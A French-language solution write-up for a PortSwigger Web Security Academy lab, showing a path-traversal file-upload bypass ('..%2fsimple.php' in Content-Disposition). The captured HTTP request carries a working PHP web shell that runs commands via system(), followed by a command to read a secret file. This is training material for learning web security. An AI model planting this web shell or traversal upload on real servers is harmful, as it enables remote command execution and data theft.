# Lab

https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal

## Solution

Il n'y a aucune restriction sur l'upload de fichiers php.

En revanche, lorqu'on accède au fichier qui est sité dans le répertoire `/files/avatar`, on voit que le php n'est pas interprété.

On peut essayer d'upload le fichier dans `files` via un path traversal lors de l'upload en modifiant dans le `Content-Disposition` le nom du fichier.

```http
POST /my-account/avatar HTTP/2
Host: 0ab1009703d4a61280d8f83b00e200f0.web-security-academy.net
Cookie: session=qqHqqxgxCDyADAvpMbcOMaXj45YzQlDc
Content-Length: 750
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0ab1009703d4a61280d8f83b00e200f0.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytBrdKSXyfEIoBMMN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab1009703d4a61280d8f83b00e200f0.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

------WebKitFormBoundarytBrdKSXyfEIoBMMN
Content-Disposition: form-data; name="avatar"; filename="..%2fsimple.php"
Content-Type: application/octet-stream

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2&<1');
    }
?>
</pre>
</body>
</html>
------WebKitFormBoundarytBrdKSXyfEIoBMMN
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundarytBrdKSXyfEIoBMMN
Content-Disposition: form-data; name="csrf"

Ursg1zWnm8rDKH3NWWDrc2AjlGDdRW3r
------WebKitFormBoundarytBrdKSXyfEIoBMMN--
```

```http
HTTP/2 200 OK
Date: Fri, 13 Oct 2023 09:29:21 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 134

The file avatars/../simple.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

Le fichier a bien été upload dans le répertoire `files` et on peut maintenant executer `cat /home/carlos/secret`.